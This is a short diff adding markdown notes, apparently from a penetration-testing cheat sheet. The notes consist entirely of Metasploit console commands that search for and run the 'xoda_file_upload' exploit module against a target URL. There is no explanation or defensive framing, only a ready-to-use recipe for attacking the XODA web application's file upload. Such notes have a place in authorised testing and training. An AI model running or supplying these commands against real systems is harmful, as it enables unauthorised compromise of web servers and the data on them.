@@ -1,0 +1,7 @@
+__search xoda__
+```
+use exploit/unix/webapp/xoda_file_upload
+set TARGETURL /
+exploit
+```
+
